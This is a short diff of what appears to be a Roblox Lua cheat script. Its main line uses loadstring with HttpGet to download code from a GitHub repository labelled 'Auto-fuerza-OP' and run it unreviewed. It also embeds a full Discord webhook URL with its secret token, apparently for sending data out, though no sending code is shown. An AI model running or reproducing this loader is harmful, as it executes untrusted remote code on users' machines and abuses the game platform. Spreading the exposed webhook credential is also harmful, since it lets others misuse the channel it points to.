@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CTXxALEJANDROxX/Auto-fuerza-OP/refs/heads/main/OP%20Force%20CTX", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CTXxALEJANDROxX/Auto-fuerza-OP/refs/heads/main/OP%20Force%20CTX",true))()
 -- Tu Webhook
 local webhookURL = "https://discord.com/api/webhooks/1371196342701129940/5O7Py9NLs3LA5tbpzhLk6tsYUid51U1IdWBD9rCyJACjCp5sUyEnomoiXwAorQXQU3IX"
 
